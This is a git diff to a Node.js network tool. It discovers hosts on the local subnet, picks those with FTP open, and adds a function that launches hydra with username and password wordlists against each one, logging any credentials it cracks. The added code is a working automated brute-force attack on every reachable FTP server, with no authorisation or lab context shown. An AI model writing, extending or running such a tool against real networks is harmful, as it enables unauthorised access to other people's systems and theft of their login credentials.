@@ -1,4 +1,4 @@
-const { exec } = require('child_process');
+const { exec, spawn } = require('child_process');
 const { promisify } = require('util');
 const hexToBin = require('hex-to-binary');
 
@@ -8,10 +8,27 @@ const ipAddressRegex = '([0-2]*[0-9]*[0-9]\\.){3}[0-2]*[0-9]*[0-9]';
 const hexRegex = '0x([0-9]|[a-f])*';
 
 async function scanNetwork () {
-  const { ip, mask } = await getHostIp().catch(e => err(e.message));
+  const {
+    ip,
+    mask
+  } = await getHostIp().catch(e => err(e.message));
   const hosts = await getOpenPorts(ip, mask).catch(e => err(e.message));
+  process.stdout.write(`Found ${hosts.length} hosts on the network!\n`);
   const hostsWithTcpOpen = hosts.filter(e => e.ports.some(port => port.status === 'open' && port.service === 'ftp'))
-  console.log({hostsWithTcpOpen})
+  process.stdout.write(`Found ${hostsWithTcpOpen.length} hosts with open tcp ports!\n`);
+  await Promise.all(hostsWithTcpOpen.map(host => bruteForceAttack('ftp', host.ip)))
+}
+
+async function bruteForceAttack (protocol, ip) {
+  const hydra = spawn('hydra', ['-L', 'data/usernames.txt', '-P', 'data/passwords.txt', `${protocol}://${ip}`])
+  hydra.stdout.pipe(process.stdout);
+  hydra.stderr.pipe(process.stderr);
+  hydra.stdout.on('data', data => {
+    const match = data.toString().match(/login:.*password.*/);
+    if (match) {
+      process.stdout.write(`[${protocol}://${ip}] CREDENTIALS FOUND (${match[0]})`)
+    }
+  })
 }
 
 async function getHostIp (netInterface = 'en0') {
